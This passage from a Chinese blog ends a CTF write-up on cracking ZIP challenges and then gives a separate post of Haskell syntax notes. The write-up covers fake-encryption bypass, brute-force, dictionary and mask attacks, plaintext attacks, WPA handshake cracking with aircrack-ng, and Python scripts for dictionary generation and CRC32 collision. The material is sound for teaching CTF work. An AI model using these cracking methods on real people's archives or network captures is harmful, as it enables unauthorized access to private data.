<p><strong>对于伪加密有以下几种方法：</strong></p>
<ol>
<li><p>在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包</p>
</li>
<li><p>使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误</p>
</li>
<li><p>使用16进制编辑器改回加密标记位</p>
</li>
</ol>
<p>以HBCTF的一道题讲解这几种方法：</p>
<p><img src="/images/2017-11-12/4402f75b-6999-42ca-a368-944c48e1066c.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>如上，尝试解压压缩包时提示有密码，根据题干：比爆破更好的方法推测为伪加密，用三种方法来解此题：</p>
<ol>
<li>用除windows外的系统直接打开压缩包</li>
</ol>
<p>在Mac OS和部分Linux系统（如Kali）中，右键解压可直接打开伪加密的zip压缩包，笔者暂未明确何种Linux能打开伪加密压缩包，如有传授，不胜感激！</p>
<ol start="2">
<li>使用ZipCenOp.jar（需java环境） 使用方法</li>
</ol>
<p>java -jar ZipCenOp.jar r xxx.zip</p>
<p><img src="/images/2017-11-12/bef05703-6e42-4317-b03d-758534ce6a29.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>经ZipCenOp.jar解密后的压缩包可直接打开</p>
<p><img src="/images/2017-11-12/082f2f7a-5090-4384-91c5-131e155f4638.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>推荐使用这种方法，最便捷</p>
<ol start="3">
<li>用16进制编辑器修改加密标记位</li>
</ol>
<p><img src="/images/2017-11-12/70c5d8a2-cc59-40ac-94c5-dace44d4d5d8.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>如上图，修改加密标记位为00，保存，即可打开压缩包（关于zip文件的结构，请翻到本文最末0x07部分）</p>
<p><strong>0x04. 爆破/字典/掩码攻击</strong></p>
<p>把这三种归位一类是因为这三种方法在本质上都是逐个尝试，只不过待选密码的集合不同</p>
<ol>
<li><p>爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码</p>
</li>
<li><p>字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上</p>
</li>
<li><p>掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少</p>
</li>
</ol>
<p>对这一类的zip问题，推荐windows下的神器AZPR</p>
<p>举例如下：</p>
<ol>
<li>对爆破，以ISCC 2017 Basic-08为例，选定暴力攻击、字符集和长度后进行爆破</li>
</ol>
<p><img src="/images/2017-11-12/d4a20959-4eb1-445d-8522-be8800af19a2.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p><img src="/images/2017-11-12/eda9d191-8c4e-40ca-9cfc-9f28f9820744.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>点击开始，进行爆破，如下图，在4ms内就找到了密码为BIT</p>
<p><img src="/images/2017-11-12/c37f0cf4-8cf9-4bb1-8092-2cab0352b7d1.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>另：此题后续为简单的base64解密；爆破在密码长度小于6位时较快，因此如果在7位之内没有爆破出结果时，基本就可以考虑换个方法了；此题的正规解法是培根密码的转换</p>
<ol start="2">
<li>字典，还以之前的ISCC 2017 Basic-07举例，从图片中分离出一个加密的zip压缩包，爆破无果后考虑字典攻击（可从网上下载字典，但大多数题目需要自己构造字典，文末的网盘连接里提供了常见的字典）</li>
</ol>
<p><img src="/images/2017-11-12/1b80a910-e093-4c57-94d1-3abe7e9cada8.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>字典攻击的结果如下图，在字典选择合适的情况下，用很短的时间就能找到密码</p>
<p><img src="/images/2017-11-12/a050cfb3-03e7-4a58-938c-91e9190835f3.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>继续以此题为例，解压后的压缩包有一个txt文档和一个握手包，txt内容如下：</p>
<p><img src="/images/2017-11-12/e4e6f09e-bed2-4e4e-acc9-37cdfd3d4bae.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>因此可知握手包的密码为ISCC****的形式（*代表大写字母或数字），自己写程序构造字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> string</div><div class="line">pw = <span class="string">'ISCC'</span></div><div class="line">s = string.digits + string.uppercase<span class="comment">#s为后四位密码的可选字符集</span></div><div class="line">  </div><div class="line">f = open(<span class="string">'dic.txt'</span>, <span class="string">'w'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</div><div class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> s:</div><div class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> s:</div><div class="line">                f.write(pw + i + j + p + q + <span class="string">'\n'</span>)<span class="comment">#注意字典中的每一条记录都以\n结尾</span></div><div class="line">                 </div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>运行此程序得到字典如下：</p>
<p><img src="/images/2017-11-12/8c1b66a8-ae92-44b2-9b30-b3044e5d4ea1.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>之后用aircrack-ng来选中字典跑除握手包的密码如下图，不再详述</p>
<p><img src="/images/2017-11-12/2c3138fd-35fd-4bf6-90c3-f0ed7879d235.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p><img src="/images/2017-11-12/f2dd1797-5ef2-4aae-bb8e-e42f415a0c47.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<ol start="3">
<li>掩码攻击，以ISCC 2017 Misc-06为例，题目给了一个jpg图片，用0x02中的方法分离出加密的压缩包，根据题目提示：注意署名， 构造????LiHua的掩码（?可在自己定义的字符集中任意选择）进行掩码攻击，如下图：</li>
</ol>
<p><img src="/images/2017-11-12/3cb82d40-9d28-436f-b5a7-cdc72e531c0a.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>攻击结果如下，只耗费了很少的时间就找到了密码</p>
<p><img src="/images/2017-11-12/b4adc984-cf39-4e3b-8e19-109e5325c0b8.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p><strong>0x05. 明文攻击</strong></p>
<font color="#f00">明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</font>，更详细的原理请读者自行谷歌<br><br>举个例子，已知 明文攻击.zip 中存在的文件 明文.txt，<br><br>因此将 明文.txt 压缩，这里需要判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。<br><br><img src="/images/2017-11-12/80c253aa-6d1a-45d0-924b-e0c04d53750c.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br><br><br>攻击过程如下：<br><br><img src="/images/2017-11-12/2de96199-e5c8-41ac-932c-816aea78148a.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br>点击开始，很快就恢复了密码<br><br><img src="/images/2017-11-12/aefe58e9-d708-4ef3-b7ee-cba6ab2b777b.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br>另：当明文的大小比较小时，攻击速度会比较慢；即使有时没有恢复密码，也可以使用明文攻击，最后点保存还是能得到压缩包里内容的。<br><br><strong>0x06. CRC32碰撞</strong><br><br>CRC32:CRC本身是“<a href="http://baike.baidu.com/item/CRC32" target="_blank" rel="external">冗余校验码</a>”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。<br><br>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容<br><br>还是以之前HBCTF伪加密那道题为例，另一种解法就是CRC32碰撞，打开压缩包，可以看出压缩文件 flag6位数<br><br>的CRC32值为0x9c4d9a5d<br><br><img src="/images/2017-11-12/36822cdc-36ae-4c31-acd0-6400ace26953.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br>因此写出碰撞的脚本如下：<br><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">  </div><div class="line">crc = <span class="number">0x9c4d9a5d</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>, <span class="number">999999</span> + <span class="number">1</span>):<span class="comment">#题目提示flag为6位数，因此只选择6位数字爆破</span></div><div class="line">    <span class="keyword">if</span> (binascii.crc32(str(i)) &amp; <span class="number">0xffffffff</span>) == crc:</div><div class="line">        <span class="keyword">print</span> i</div></pre></td></tr></table></figure><br><br><font color="#f00">要特别注意<br><br>if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:<br><br>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。</font>

<p>脚本的运行结果如下，即为压缩文件的内容：</p>
<p><img src="/images/2017-11-12/712d9efc-cdbc-4863-bcab-aa9d39ba5ae0.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>再举另一个bugku中的例子，下载下来的文件是68个压缩包，并且根据binwalk的检查结果，每个压缩包里都有一个大小为4个字节，名为out.txt的压缩文件</p>
<p><img src="/images/2017-11-12/22e9812a-c63a-4b22-8d4b-2ac8a9a84928.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>用如下的脚本碰撞出所有压缩包中的数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> zipfile</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</div><div class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</div><div class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</div><div class="line">                    s = i + j + p + q</div><div class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</div><div class="line">                        <span class="comment">#print s</span></div><div class="line">                        f.write(s)</div><div class="line">                        <span class="keyword">return</span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</div><div class="line">        file = <span class="string">'out'</span> + str(I) + <span class="string">'.zip'</span></div><div class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</div><div class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</div><div class="line">        crc = GetCrc.CRC</div><div class="line">        <span class="comment">#以上3行为获取压缩包CRC32值的步骤</span></div><div class="line">        <span class="comment">#print hex(crc)</span></div><div class="line">        CrackCrc(crc)</div><div class="line">  </div><div class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></div><div class="line">  </div><div class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</div><div class="line">CrackZip()</div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>此题较为繁琐，之后的步骤不再展开</p>
<p>另：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况</p>
<p>笔者附：由于上述编写的代码速率不高，而且存在些许瑕疵，所以这里推荐使用工具<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="external">https://github.com/theonlypwner/crc32</a></p>
<p><strong>0x07. 修改格式</strong></p>
<p>这种情况花样较多，难以做一个详细的总结，因此只列举最常见的缺少文件头或文件尾。</p>
<p>放一个zip文件格式讲的较清楚的<a href="http://blog.csdn.net/ETF6996/article/details/51946250" target="_blank" rel="external">链接</a>，通过对zip文件格式的了解，可以解释之前伪加密的问题，同时也可以对缺少文件头或文件尾有更直观的认识。</p>
<p><img src="/images/2017-11-12/b7e72a70-dfcb-430a-986c-37d305e6b05a.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>如上为正常zip，缺头zip和缺尾zip的binwalk扫描结果，根据扫描结果用16进制编辑器添加文件头或文件尾，即可修复zip。</p>
<p><strong>总结</strong></p>
<p>Zip不仅是我们生活中常用到的一种文件格式，在CTF中也经常遇到，这里做了一个关于CTF中zip的总结，如果对读者有帮助，鄙人不胜荣幸。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/15/haskell学习笔记——基本语法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/10/15/haskell学习笔记——基本语法/" itemprop="url">haskell学习笔记——基本语法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-15T00:11:49+08:00">
                2017-10-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>挖了Haskell这个坑,希望在纯函数式环境锻炼自己的函数式编程思维<br>首先来说一下环境,首先安装Haskell Platform也就是GHC<br>推荐Mac下Haskell这个IDE,也可以在GHCI这样的REPL下练习<br>话不多说,现在来学习一下Haskell的基本语法</p>
<p>参考： <a href="https://wiki.haskell.org/Haskell" target="_blank" rel="external">https://wiki.haskell.org/Haskell</a></p>
<h1 id="文件执行"><a href="#文件执行" class="headerlink" title="文件执行"></a>文件执行</h1><p>方法1: 编译后执行</p>
<blockquote>
<p>ghc --make hello</p>
<p>./hello</p>
</blockquote>
<p>方法2：解释执行</p>
<blockquote>
<p>ghci hello.hs </p>
</blockquote>
<h1 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h1><p>Haskell中的基本运算符与其他语言类似</p>
<ul>
<li>加 减 乘 除 + - * /<br><code>1+1</code></li>
<li>布尔运算符 与 或 非 &amp;&amp; || not<br><code>not True</code></li>
<li>关系运算符 等于 不等 == /=<br><code>not True == False</code></li>
</ul>
<h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><p>Haskell中的函数调用使用空格的方式<br><code>succ 8</code><br><code>succ</code>单参数函数,返回一个数的后继<br><code>min 8 9</code><br><code>min</code>返回较大的元素</p>
<blockquote>
<p>可以用<code></code>(数字1前的按键)将函数括起来作为中缀函数使用,如下</p>
</blockquote>
<p>9 `div` 3</p>
<h1 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h1><blockquote>
<h3 id="函数式编程语言特点"><a href="#函数式编程语言特点" class="headerlink" title="函数式编程语言特点"></a>函数式编程语言特点</h3><p>在Haskell这门纯函数式语言中,Haskell中只有定义没有赋值,已经定义的值是不能修改的,类似于数学中的变量,它的意义是这个变量代表了一个值,而非这个变量处在这个值的状态,所以说<strong>纯</strong>函数式编程中函数只能去引用数的计算结果,不会产生副作用,无论何时以同样的参数call函数都会获得一样的结果,所以函数很适合作为first class, 获得与其他语言中变量同等的地位</p>
</blockquote>
<h3 id="let关键词用于声明常量"><a href="#let关键词用于声明常量" class="headerlink" title="let关键词用于声明常量"></a>let关键词用于声明常量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">let doubleMe x = x + x</div><div class="line">doubleMe 2</div><div class="line"></div><div class="line">let doubleUs x y =</div><div class="line">      &#123;- 在函数中定义函数 -&#125;</div><div class="line">      let doublex = 2 * x</div><div class="line">          doubley = 2 * y</div><div class="line">      in doublex + doubley</div></pre></td></tr></table></figure>
<ul>
<li>可以在函数中调用其他函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">let doubleUs x y = doubleMe x + doubleMe y</div><div class="line">doubleUs 2 3</div></pre></td></tr></table></figure>
<h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><h3 id="if-then-else语句"><a href="#if-then-else语句" class="headerlink" title="if then else语句"></a>if then else语句</h3><p>Haskell中if语句实际上是一个表达式<br>每个if都要有thenelse两部分,else不是可选的,这也就保证了表达式一定有其返回值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let doubelSmallNumber x = if x &gt; 100</div><div class="line">                         then x</div><div class="line">                         else doubleMe x</div></pre></td></tr></table></figure>
<blockquote>
<p>Haskell中常在函数名后加单引号&#39;来区分一个相似的函数</p>
</blockquote>
<h3 id="case语句"><a href="#case语句" class="headerlink" title="case语句"></a>case语句</h3><p>case语句可以用来进行多值匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let isOneOrTwo x = case x of 1 -&gt; &quot;1:One&quot;</div><div class="line">                             2 -&gt; &quot;2:No Two&quot;</div><div class="line">                             otherwise -&gt; &quot;otherwise&quot;</div></pre></td></tr></table></figure>
<h3 id="where语句"><a href="#where语句" class="headerlink" title="where语句"></a>where语句</h3><p>where语句其实是对变量的定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let doubleUs x y = doublex + doubley</div><div class="line">                    where doublex = 2 * x</div><div class="line">                          doubley = 2 * y</div></pre></td></tr></table></figure>
<h3 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">let lucky 7 = &quot;You are lucky&quot;</div><div class="line">let lucky x = &quot;Sorry, you are not lucky&quot;</div><div class="line">lucky 7</div><div class="line">lucky 8</div><div class="line">--另例</div><div class="line">foo 0 x = x + 1</div><div class="line">foo 1 x = x - 1</div><div class="line">foo 2 x = 0</div></pre></td></tr></table></figure>
<p>上例表明：如果lucky 7，就返回&quot;You are lucky&quot;，否则&quot;Sorry, you are not lucky&quot;</p>
<h3 id="guard"><a href="#guard" class="headerlink" title="guard"></a>guard</h3><p>有时，模式匹配单独无法有效描述一个函数，引入一个称为guard的模式，如果这个模式匹配，每个guard的测试表达式将按顺序检查，如果测试表达式匹配，guard的值将被使用。</p>
<p>Guard开始使用 | ，后面是一个测试表达式，其返回结果或真或假，后面跟着 =，然后是返回的值，otherwise能够捕获其他所有情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">let mydiv x y</div><div class="line">      | y == 0 = &quot;Can not divide&quot;</div><div class="line">      | x / y &gt; 10 = &quot;first number is larger than the second number&quot;</div><div class="line">      | x / y &lt; 1  = &quot;first number is less than the second number&quot;</div><div class="line">      | otherwise = &quot;almost equal&quot;</div></pre></td></tr></table></figure>
<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">--配合guard</div><div class="line">let mysum x y</div><div class="line">      | x &gt; y = mysum y x</div><div class="line">      | x == y = x</div><div class="line">      | otherwise = x + mysum (x+1) y</div></pre></td></tr></table></figure>
<blockquote>
<p>模式匹配与guard的区别:区别就在于一个对比的是对象，一个对比的是布尔值。</p>
</blockquote>
<h3 id="函数定义-1"><a href="#函数定义-1" class="headerlink" title="函数定义"></a>函数定义</h3><p>下面是我们定义一个函数addone，输入参数是整数，输出也是整数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">addOne :: Integer -&gt; Integer</div><div class="line">addOne n = n + 1</div></pre></td></tr></table></figure>
<p>第一行是我们定义一个函数名称为addOne，这个函数有一个Integer参数，返回一个Integer。第二行表示对于我们函数的任何输入，我们将把这个输入表示为n，那么我们将返回n+1。</p>
<p>注意，这里 = 是数学中的意义，在我们程序中任何地方有addOne n，我们能够使用n+1来替代它，得到的都是精确同样的结果，这其实是引用透明的案例，因为我们的函数对于任何给定输入总是返回同样的值。</p>
<p>addOne 10<br>返回11</p>
<p>调用这个函数的方式是函数名称后跟着参数，之间都是有空格分开，没有任何逗号和括号，</p>
<h3 id="函数与模式匹配"><a href="#函数与模式匹配" class="headerlink" title="函数与模式匹配"></a>函数与模式匹配</h3><p>让我们定义另外一个函数，它是对于输入一个姓氏能够输出其姓名:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lastName :: String -&gt; String</div><div class="line">lastName &quot;anthony&quot; = &quot;gillis&quot;</div><div class="line">lastName &quot;michelle&quot; = &quot;jocasta&quot;</div><div class="line">lastName &quot;gregory&quot; = &quot;tragos&quot;</div></pre></td></tr></table></figure>
<p>Haskell函数定义依赖于模式匹配，如果你使用参数&quot;anthony&quot;调用lastName函数，，那么函数就会返回字符串&quot;gillis&quot;，如果你使用&quot;michelle&quot;，那么就会返回&quot;jocasta&quot;</p>
<p>但是如果我们输入一个在这三个中不存在姓呢？</p>
<p>lastName &quot;bob&quot;</p>
<p>就会得到一个exception: Non-exhaustive patterns in function lastName。这是因为我们的函数不是total，它并没有对于每个可能的输入有一个定义好的输出，通常函数应该是无论任何可能都是确定的，那么我们重新定义函数如下：</p>
<p>lastName :: String -&gt; String<br>lastName &quot;anthony&quot; = &quot;gillis&quot;<br>lastName &quot;michelle&quot; = &quot;jocasta&quot;<br>lastName &quot;gregory&quot; = &quot;tragos&quot;<br>lastName n = &quot;<unknown>&quot;</unknown></p>
<p>现在我们的函数是total了，最后一个会捕获所有情况，如果上面三个不匹配，那么最后一个总是将参数绑定到n，<font color="#f00">我们能够使用_ 来代表n 表示我们其实不关心其值。</font></p>
<h3 id="多个参数函数"><a href="#多个参数函数" class="headerlink" title="多个参数函数"></a>多个参数函数</h3><p>让我们定义一个函数areAscending，它有三个整数参数，如果它们是严格递增那么就返回真：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">areAscending :: Integer -&gt; Integer -&gt; Integer -&gt; Bool</div><div class="line">areAscending a b c = a &lt; b &amp;&amp; b &lt; c</div></pre></td></tr></table></figure>
<p>我们的类型语法看上去是不是有点奇怪？参数之间有箭头，且返回一个值类型？这种多参数函数称为curried，柯里化是将多个参数的一个函数作为输入，转入一系列只有一个参数的函数，返回另外一个函数，比如用伪Swift代码如下：</p>
<p>myFunc(a: A, b: B, c: C) -&gt; Z</p>
<p>函数func1(a: A)当被调用时，返回一个函数func2(b: B)，它又返回一个函数func3(c: C)，它被调用最后返回Z类型结果。</p>
<p>请注意，在我们的模式匹配中，我们分配第一个参数到a，第二个是b，第三个是c，这样我们能够在=后面使用它们来执行我们的计算：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">areAscending 1 2 3</div><div class="line">-- = True</div><div class="line"></div><div class="line">areAscending 3 4 2</div><div class="line">-- = False</div></pre></td></tr></table></figure>
<p>如果我们希望使用一个表达式调用这个函数，而不是一个个参数遍历，那么我们需要使用括号包围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">areAscending 1 (1 + 1) 3</div><div class="line">-- = True</div></pre></td></tr></table></figure>
<p>而没有括号的areAscending 1 1 + 1 3则被解释为(areAscending 1 1) + (1 3)，这是没有意义。</p>
<h3 id="零参数函数"><a href="#零参数函数" class="headerlink" title="零参数函数"></a>零参数函数</h3><p>如果参数没有怎么办？零参数函数也是一个函数，总是返回一个值，这又是引用透明的原理了，因为只有一个办法调用无参数函数，这个函数也总是返回一个值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">someValue :: String</div><div class="line"></div><div class="line">someValue = &quot;hello world&quot;</div></pre></td></tr></table></figure>
<p>零参数函数类似于常量，只要看到someValue，我们都可以使用&quot;hello world&quot;来替代，这正是我们从一个常量中应该预期到结果。</p>
<h3 id="绑定Binding与变量不可变"><a href="#绑定Binding与变量不可变" class="headerlink" title="绑定Binding与变量不可变"></a>绑定Binding与变量不可变</h3><p>Haskell使用=实现绑定，前面我们说=是引用透明的案例，是一种数学意义，实际是将两者绑定了。</p>
<p>Binding名称不能大写，绑定可以定义一个或多个参数的函数，函数和参数使用空格，这是Haskell区别其他语言的简洁之处</p>
<font color="#f00">括号可以包装复合表达式，当然也可以使用\$符号</font>



<p>与命令式语言变量不同,Haskell绑定变量 不可变的</p>
<p>特点有两个：</p>
<ol>
<li>order-independent ——绑定在源代码的顺序并不重要</li>
<li>Lazy懒赋值 ——定义变量只在需要的时候进行赋值</li>
</ol>
<p>此外，变量名的scope是只在自己定义的范围内递归的</p>
<h3 id="表达式和绑定都有一个类型"><a href="#表达式和绑定都有一个类型" class="headerlink" title="表达式和绑定都有一个类型"></a>表达式和绑定都有一个类型</h3><ul>
<li>Bool - 有两个元素： True 或 False</li>
<li>Char - unicode符合集合</li>
<li>Int - 固定大小整数</li>
<li>Integer - 无限大小整数</li>
<li>Double - IEEE 浮点数字</li>
<li><em>type1</em> -&gt; <em>type2</em> - 一个输入类型<em>type1</em> 到输出类型 <em>type2</em>的函数</li>
<li>(<em>type1</em>, <em>type2</em>, ..., <em>typeN</em>) - 类型数组tuple</li>
<li>() - 零数组tuple, 称为<em>unit</em> (类似C的void); 这个类型只有一个值：空。</li>
</ul>
<h3 id="Monoid"><a href="#Monoid" class="headerlink" title="Monoid"></a>Monoid</h3><p>首先，需要了解<a href="http://www.jdon.com/idea/monoid.html" target="_blank" rel="external">什么是Monoid</a>。在形式语言与自动机中有介绍！在Haskell中，表达三个函数的Monoid可以如下表达：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">add :: Integer -&gt; (Integer -&gt; Integer)</div><div class="line">add arg1 arg2 = arg1 + arg2</div></pre></td></tr></table></figure>
<p>这里使用括号，其实这个Monoid符合结合律，括号是没有必要的，等同于如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add :: Integer -&gt; Integer -&gt; Integer</div></pre></td></tr></table></figure>
